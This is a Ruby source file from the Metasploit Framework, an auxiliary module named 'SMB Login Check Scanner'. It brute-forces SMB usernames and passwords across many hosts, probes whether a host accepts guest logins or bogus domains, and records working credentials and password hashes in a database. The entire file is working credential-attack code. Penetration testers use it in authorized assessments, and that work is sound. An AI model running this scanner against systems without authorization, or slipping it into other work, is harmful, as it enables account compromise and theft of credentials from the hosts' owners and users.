##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	attr_reader :accepts_bogus_domains

	def proto
		'smb'
	end
	def initialize
		super(
			'Name'           => 'SMB Login Check Scanner',
			'Description'    => %q{
				This module will test a SMB login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'         => 'tebo <tebo [at] attackresearch [dot] com>',
			'References'     =>
				[
					[ 'CVE', '1999-0506'] # Weak password
				],
			'License'     => MSF_LICENSE
		)
		deregister_options('RHOST','USERNAME','PASSWORD')

		@accepts_bogus_domains = []
		@accepts_guest_logins = {}

		# These are normally advanced options, but for this module they have a
		# more active role, so make them regular options.
		register_options(
			[
				OptString.new('SMBPass', [ false, "SMB Password" ]),
				OptString.new('SMBUser', [ false, "SMB Username" ]),
				OptString.new('SMBDomain', [ false, "SMB Domain", 'WORKGROUP']),
				OptBool.new('PRESERVE_DOMAINS', [ false, "Respect a username that contains a domain name.", true]),
				OptBool.new('RECORD_GUEST', [ false, "Record guest-privileged random logins to the database", false]),
			], self.class)
	end

	def run_host(ip)
		print_brute(:level => :vstatus, :ip => ip, :msg => "Starting SMB login bruteforce")

		if accepts_bogus_logins?
			print_error("#{smbhost} - This system accepts authentication with any credentials, brute force is ineffective.")
			return
		end

		begin
			if accepts_guest_logins?
				print_error("#{ip} - This system allows guest sessions with any credentials, these instances will not be reported.")
			end
		end unless datastore['RECORD_GUEST']

		begin
			each_user_pass do |user, pass|
				result = try_user_pass(user, pass)
				if result == :next_user
					unless user == user.downcase
						result = try_user_pass(user.downcase, pass)
						if result == :next_user
							print_status("Username is case insensitive")
							user = user.downcase
						end
					end
					report_creds(user,pass) if @accepts_guest_logins.select{ |g_host, g_creds| g_host == ip and g_creds == [user,pass] }.empty?
				end
			end
		rescue ::Rex::ConnectionError
			nil
		end

	end

	def accepts_guest_logins?
		guest = false
		orig_user,orig_pass = datastore['SMBUser'],datastore['SMBPass']
		datastore["SMBUser"] = Rex::Text.rand_text_alpha(8)
		datastore["SMBPass"] = Rex::Text.rand_text_alpha(8)

		# Connection problems are dealt with at a higher level
		connect()

		begin
			smb_login()
		rescue ::Rex::Proto::SMB::Exceptions::LoginError
		rescue ::Rex::Proto::SMB::Exceptions::ErrorCode
		end

		begin
			guest = true
			@accepts_guest_logins['rhost'] ||=[] unless @accepts_guest_logins.include?(rhost)
			report_note(
				:host	=> rhost,
				:proto => 'tcp',
				:sname	=> 'smb',
				:port   =>  datastore['RPORT'],
				:type   => 'smb.account.info',
				:data   => 'accepts guest login from any account',
				:update => :unique_data
			)
		end unless(simple.client.auth_user)

		disconnect()
		datastore['SMBUser'],datastore['SMBPass'] = orig_user,orig_pass
		return guest

	end


	def accepts_bogus_logins?
		orig_user,orig_pass = datastore['SMBUser'],datastore['SMBPass']
		datastore["SMBUser"] = Rex::Text.rand_text_alpha(8)
		datastore["SMBPass"] = Rex::Text.rand_text_alpha(8)

		# Connection problems are dealt with at a higher level
		connect()

		begin
			smb_login()
		rescue ::Rex::Proto::SMB::Exceptions::LoginError
		rescue ::Rex::Proto::SMB::Exceptions::ErrorCode
		end

		disconnect()
		datastore['SMBUser'],datastore['SMBPass'] = orig_user,orig_pass

		return simple.client.auth_user ? true : false
	end

	def accepts_bogus_domains?(addr)
		if @accepts_bogus_domains.include? addr
			return true
		end
		orig_domain = datastore['SMBDomain']
		datastore['SMBDomain'] = Rex::Text.rand_text_alpha(8)

		connect()
		begin
			smb_login()
		rescue ::Rex::Proto::SMB::Exceptions::LoginError
		rescue ::Rex::Proto::SMB::Exceptions::ErrorCode
		end
		disconnect()
		datastore['SMBDomain'] = orig_domain

		if simple.client.auth_user
			@accepts_bogus_domains << addr
			return true
		else
			return false
		end
	end

	def try_user_pass(user, pass)
		# The SMB mixins require the datastores "SMBUser" and
		# "SMBPass" to be populated.
		datastore["SMBPass"] = pass
		orig_domain = datastore["SMBDomain"]
		# Note that unless PRESERVE_DOMAINS is true, we're more
		# than happy to pass illegal usernames that contain
		# slashes.
		if datastore["PRESERVE_DOMAINS"]
			d,u = domain_username_split(user)
			datastore["SMBUser"] = u.to_s.gsub(/<BLANK>/i,"")
			datastore["SMBDomain"] = d if d
		else
			datastore["SMBUser"] = user.to_s.gsub(/<BLANK>/i,"")
		end

		# Connection problems are dealt with at a higher level
		connect()

		begin
			smb_login()
		rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
			if e.get_error(e.error_code) == "STATUS_ACCESS_DENIED"
				print_error("#{smbhost} - FAILED LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass} (#{e.get_error(e.error_code)})")
				disconnect()
				datastore["SMBDomain"] = orig_domain
				return :skip_user
			else
				raise e
			end

		rescue ::Rex::Proto::SMB::Exceptions::LoginError => e

			case e.error_reason
			when 'STATUS_LOGON_FAILURE', 'STATUS_ACCESS_DENIED'
				# Nothing interesting
				vprint_error("#{smbhost} - FAILED LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass} (#{e.error_reason})")
				disconnect()
				datastore["SMBDomain"] = orig_domain
				return

			when 'STATUS_ACCOUNT_DISABLED'
				report_note(
					:host	=> rhost,
					:proto => 'tcp',
					:sname	=> 'smb',
					:port   =>  datastore['RPORT'],
					:type   => 'smb.account.info',
					:data   => {:user => user, :status => "disabled"},
					:update => :unique_data
				)

			when 'STATUS_PASSWORD_EXPIRED'
				report_note(
					:host	=> rhost,
					:proto => 'tcp',
					:sname	=> 'smb',
					:port   =>  datastore['RPORT'],
					:type   => 'smb.account.info',
					:data   => {:user => user, :status => "expired password"},
					:update => :unique_data
				)

			when 'STATUS_ACCOUNT_LOCKED_OUT'
				report_note(
					:host	=> rhost,
					:proto => 'tcp',
					:sname	=> 'smb',
					:port   =>  datastore['RPORT'],
					:type   => 'smb.account.info',
					:data   => {:user => user, :status => "locked out"},
					:update => :unique_data
				)
			end
			print_error("#{smbhost} - FAILED LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass} (#{e.error_reason})")

			disconnect()
			datastore["SMBDomain"] = orig_domain
			return :skip_user # These reasons are sufficient to stop trying.
		end

		if(simple.client.auth_user)
			print_status("Auth-User: #{simple.client.auth_user.inspect}")
			print_good("#{smbhost} - SUCCESSFUL LOGIN (#{smb_peer_os}) '#{splitname(user)}' : '#{pass}'")
		else
			print_status("#{rhost} - GUEST LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass}")
			@accepts_guest_logins[rhost] = [user, pass] unless datastore['RECORD_GUEST']
		end

		disconnect()
		# If we get here then we've found the password for this user, move on
		# to the next one.
		datastore["SMBDomain"] = orig_domain
		return :next_user
	end

	def report_creds(user,pass)

		report_hash = {
			:host	=> rhost,
			:port   => datastore['RPORT'],
			:sname	=> 'smb',
			:pass   => pass,
			:source_type => "user_supplied",
			:active => true
		}
		if accepts_bogus_domains? rhost
			if datastore["PRESERVE_DOMAINS"]
				d,u = domain_username_split(user)
				report_hash[:user] = u
			else
				report_hash[:user] = "#{datastore["SMBUser"]}"
			end
		else
			if datastore["PRESERVE_DOMAINS"]
				d,u = domain_username_split(user)
				report_hash[:user] = "#{datastore["SMBDomain"]}/#{u}"
			else
				report_hash[:user] = "#{datastore["SMBDomain"]}/#{datastore["SMBUser"]}"
			end
		end

		if pass =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
			report_hash.merge!({:type => 'smb_hash'})
		else
			report_hash.merge!({:type => 'password'})
		end
		report_auth_info(report_hash)
	end

end
